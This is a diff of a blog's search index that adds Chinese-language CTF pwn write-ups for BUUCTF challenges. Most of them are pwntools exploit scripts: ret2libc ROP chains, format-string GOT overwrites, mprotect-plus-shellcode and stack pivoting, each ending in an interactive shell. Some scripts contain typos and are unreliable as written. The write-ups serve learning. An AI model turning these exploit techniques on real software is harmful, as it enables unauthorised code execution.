@@ -1,6 +1,162 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUU-[HDCTF 2023]KEEP ON的Wp</title>
+    <url>/CTF/Pwn/hdctf%E7%9A%84wp/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU-[HNCTF 2022 Week1]fmtstrre的Wp</title>
+    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU平台的做题记录</title>
+    <url>/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/</url>
+    <content><![CDATA[<h3 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h3><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><p>-&gt;32位 ret2libc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>checksec一下：</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png"></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png"></p>
+<p><strong>可知将var[13]赋值一个17(0x11)就可以得到shell</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是这个payload并没有打通。</p>
+<p><strong>这里有个知识点:</strong></p>
+<blockquote>
+<p>qword全称是Quad Word。2个字节就是1个Word（1个字，16位），q就是英文quad-这个词根（意思是4）的首字母，所以它自然是word（2字节，0~2^16-1）的四倍，8字节</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28656</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>*<span class="number">13</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>学习：32位和64位传参的区别</p>
+<p><strong>32位：</strong>直接将参数放在栈中</p>
+<p><strong>64位：</strong>前六个参数放在寄存器中（rdi rsi rdx rcx r8 r9），如果还有参数，那再依次放入栈中</p>
+<p><strong>题解：</strong></p>
+<p>这个题是64位程序，在ida中打开，发现有栈溢出漏洞（vulnerable_function函数中）</p>
+<p><code>Shift + F12</code> 可以看到有<code>system</code>函数和 <code>/bin/sh</code>字符串</p>
+<p>-&gt; 先覆盖buf和rbp</p>
+<p>-&gt; 然后是 pop rdi ret &#x3D;&gt; 将栈顶元素（binsh字符串的地址）弹入rdi寄存器中，并且返回到下一指令处</p>
+<p>-&gt; 然后是返回到system()的地址</p>
+<p>-&gt; 参数就是rdi寄存器中的 binsh字符串</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 0x00000000004006b3 : pop rdi ; ret</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span><span class="number">26999</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x600A90</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_ret_addr = <span class="number">0x4006b3</span></span><br><span class="line">payload = cyclic(<span class="number">0x80</span> + <span class="number">0x08</span>) + p64(rdi_ret_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>rdi的地址这样找：</p>
+<p><code>ROPgadget --binary level2_x64 --only &#39;pop|ret&#39;</code></p>
+</blockquote>
+<h2 id="not-the-same-3dsctf-2016-静态-32位"><a href="#not-the-same-3dsctf-2016-静态-32位" class="headerlink" title="not_the_same_3dsctf_2016[静态 32位]"></a>not_the_same_3dsctf_2016[静态 32位]</h2><p><code>ctrl + x</code> 查看调用字符串的位置</p>
+<p><code>ctrl + s</code>调出程序的段表，</p>
+<p><code>mprotect(void *addr, size_t len, int prot)函数</code></p>
+<p>-&gt; addr 内存启始地址；len 修改内存的长度；prot 内存的权限</p>
+<p>-&gt; 将.got.plt段改写为可读可写可执行的</p>
+<p><strong>肯定有人疑问了为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25763</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h2><p>checksec一下 32位 有NX保护（栈不可执行），canary保护（会放入一个值，在返回的时候会进行检查，得保证这个值没变）</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png"></p>
+<p>偏移量的计算 10 &#x3D;&gt; 我们输入的数据是从第十个开始的</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/03.png"></p>
+<p>A的ascii值是65 &#x3D;&gt; 对应十六进制的0x41             a的ascii值是97 &#x3D;&gt; 对应十六进制的0x61</p>
+<p>程序要求我们输入的值与随机数相等，才可以执行<code>system(&#39;bin/sh&#39;)</code></p>
+<p>&#x3D;&gt; 由于存在格式化字符串漏洞</p>
+<p>我们可以通过<code>%n</code> 来修改储存随机数的地址的值</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/04.png"></p>
+<p>随机数起始地址是在 0x804c044 由于随机数是四位 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26680</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>) + p32(<span class="number">0x804c045</span>) + p32(<span class="number">0x804c046</span>) + p32(<span class="number">0x804c047</span>)</span><br><span class="line">payload += <span class="string">&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>给Bss赋值，使得NX不可执行变为可执行 &#x3D;&gt; 构建shellcode</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">int mprotect(const void <span class="emphasis">*start, size_t len, int prot);</span></span><br><span class="line"><span class="emphasis">	第一个参数填的是一个地址，是指需要进行操作的地址。</span></span><br><span class="line"><span class="emphasis">	第二个参数是地址往后多大的长度。</span></span><br><span class="line"><span class="emphasis">	第三个参数的是要赋予的权限。</span></span><br><span class="line"><span class="emphasis">mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</span></span><br><span class="line"><span class="emphasis">prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</span></span><br><span class="line"><span class="emphasis">　　1）PROT_READ：表示内存段内的内容可写；</span></span><br><span class="line"><span class="emphasis">　　2）PROT_WRITE：表示内存段内的内容可读；</span></span><br><span class="line"><span class="emphasis">　　3）PROT_EXEC：表示内存段中的内容可执行；</span></span><br><span class="line"><span class="emphasis">　　4）PROT_NONE：表示内存段中的内容根本没法访问。</span></span><br><span class="line"><span class="emphasis">prot=7表示可读可写可执行，将它类比于chmod中的7</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="HDCTF-2023-KEEP-ON"><a href="#HDCTF-2023-KEEP-ON" class="headerlink" title="[HDCTF 2023]KEEP ON"></a>[HDCTF 2023]KEEP ON</h3><p><strong>知识点：格式化字符串劫持、<a href="https://www.cnblogs.com/max1z/p/15299000.html">栈迁移</a></strong></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/10.png"></p>
+<p><strong>法1,格式化字符串劫持(将printf_got 改成 system_plt)</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#   -&gt; 通过调用printf函数来调用system函数的地址，而这个程序中我们写入的内容保存在s中 然后会作为printf的参数，从而得到shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;,arch=&quot;i386&quot;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28014</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./../pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hdctf&quot;</span>)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]  <span class="comment"># 寻找got表中printf的地址</span></span><br><span class="line"></span><br><span class="line">system_glt = elf.glt[<span class="string">&#x27;system&#x27;</span>]  <span class="comment"># 寻找plt表中system的地址</span></span><br><span class="line"></span><br><span class="line">payload1 = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)  <span class="comment"># fmtstr_payload:got表劫持函数, 6是对应格式化字符串位置的索引，后面将printf的地址改成system的</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)   <span class="comment"># \n 是换行的意思.</span></span><br><span class="line"></span><br><span class="line">p.send(payload1)	<span class="comment"># 这里发送是为了将printf_got 改成 system_plt =&gt; 以后调用printf函数就相当于调用system</span></span><br><span class="line"></span><br><span class="line">vulnaddr = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;keep on !\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload2)   <span class="comment"># 这里必须用send --&gt; 因为这里的read写入0x60(溢出16字节)0x08和vuln的地址就是16字节了,sendline后面跟有换行符</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>寻找偏移量 找 616161在第几位 </p>
+<p>​	-&gt; 我们输入的是aaaa 0x61(十六进制 -&gt; ascii的97)即a</p>
+</blockquote>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/11.png"></p>
+<p><strong>法2,栈迁移,可以先阅读前面的那个文章</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ROPgadget --binary hdctf --only &quot;pop|ret&quot;  0x00000000004008d3 : pop rdi ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget --binary hdctf | grep leave   0x00000000004007f2 : leave ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28296</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;%16$p&#x27;</span>)  <span class="comment"># 获得 old_rbp</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello,0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">old_rbp = <span class="built_in">int</span>(io.recvunitl(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target_addr = old_rbp - <span class="number">0x60</span> - <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4008d3</span></span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(target_addr + <span class="number">0x20</span>) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(target_addr) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;keep on !&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Q&amp;A（个人理解）</p>
+<p><code>%16$p是哪来的</code></p>
+<p>-&gt;可以用过gdb动态调试得到old_rbp的具体值,然后通过尽量多的%p来泄露出具体位置</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/12.png"></p>
+<p><code>0x60是哪里来的?</code></p>
+<p>-&gt;子函数中栈底指向了父函数的栈底的地址, 0x7fffffffe1e0就是old_rbp - 0x7fffffffe180&#x3D;0x60</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/13.png"></p>
+<p><code>payload中为什么要加0x20 ?</code></p>
+<p>-&gt; 0x20 &#x3D; 32 &#x3D;&gt; 4个8字节, 指向了&#x2F;bin&#x2F;sh所在的位置</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/14.png"></p>
+<h3 id="BUU-HNCTF-2022-Week1-fmtstrre"><a href="#BUU-HNCTF-2022-Week1-fmtstrre" class="headerlink" title="BUU-[HNCTF 2022 Week1]fmtstrre"></a>BUU-[HNCTF 2022 Week1]fmtstrre</h3><p>先checksec一下</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/06.png"></p>
+<p>然后IDA(64)打开</p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/09.png"></p>
+<blockquote>
+<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
+<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
+<p>将name的地址赋值给v5</p>
+<p>再向buf中写入256字节数据</p>
+</blockquote>
+<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
+<p><code>这段代码中需要打开flag这个文件 =l&gt; 小技巧</code></p>
+<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
+<p>-&gt;当然,这个文件不是必须的.</p>
+<p><code>该如何利用这个漏洞？</code>根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
+<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
+<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png"></p>
+<blockquote>
+<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
+</blockquote>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png"></p>
+<blockquote>
+<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
+<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
+<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
+</blockquote>
+<p>32 + 6 &#x3D;38</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
     <url>/CTF/Web/BUU-Easy_Java/</url>
     <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
@@ -28,168 +184,6 @@
 <p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
 <p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
 <p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
-]]></content>
-      <categories>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU-[HNCTF 2022 Week1]fmtstrre的Wp</title>
-    <url>/CTF/Pwn/%5BHNCTF%202022%20Week1%5Dfmtstrre/</url>
-    <content><![CDATA[<p>先checksec一下</p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;00.png)</p>
-<p>然后IDA(64)打开</p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;01.png)</p>
-<blockquote>
-<p>open函数(成功打开文件返回非负整数，打开失败返回-1)</p>
-<p>read(fd, &amp;name, 48uLL)函数(向fd中读取48字节数据存放至name地址下)</p>
-<p>将name的地址赋值给v5</p>
-<p>再向buf中写入256字节数据</p>
-</blockquote>
-<p>格式化字符串漏洞点 <code>printf(buf)</code></p>
-<p>这段代码中需要打开flag这个文件 &#x3D;l&gt; 小技巧</p>
-<p>-&gt; 在当前目录下创建一个flag文件，并输入一些东西，可以帮助我们观察其在栈上的位置。</p>
-<p>-&gt;当然,这个文件不是必须的.</p>
-<p>该如何利用这个漏洞？根据这个题，flag这个文件的内容是存放在了栈中，那我们就要知道具体的位置。</p>
-<p>-&gt;偏移量的计算（看别人的Wp说是偏移了38）即flag 的内容是保存在第38个的位置上的</p>
-<p><strong>参考<a href="https://www.cnblogs.com/falling-dusk/p/17858030.html">https://www.cnblogs.com/falling-dusk/p/17858030.html</a></strong></p>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;02.png)</p>
-<blockquote>
-<p>找 …4141… 类似的数据，看它是第几个地址（6）</p>
-</blockquote>
-<p>![](CTF&#x2F;Pwn&#x2F;[HNCTF 2022 Week1]fmtstrre&#x2F;03.png)</p>
-<blockquote>
-<p>name即flag的位置，0x20 &#x3D;32 &#x3D;&gt;偏移量.</p>
-<p>rsp到name的距离是 0x1d0 - 0x0d0 &#x3D; 256 &#x2F; 8 &#x3D;32</p>
-<p>​	对于这里要除以8 —&gt; 我理解的是（64位程序，栈中一个小格格是8字节数据，一共相差256字节，即32个小格子）</p>
-</blockquote>
-<p>32 + 6 &#x3D;38</p>
-<p><strong>exp:</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote()</span><br><span class="line">payload = <span class="string">&quot;%38$s&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>pwn</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUU平台的Web题记录</title>
-    <url>/CTF/Web/BUU-Web%E5%88%B7%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>知识点：</p>
-<ul>
-<li>basenmae()函数的问题</li>
-<li>正则匹配的绕过</li>
-<li>代码审计</li>
-<li>PHP预定义的超全局变量</li>
-</ul>
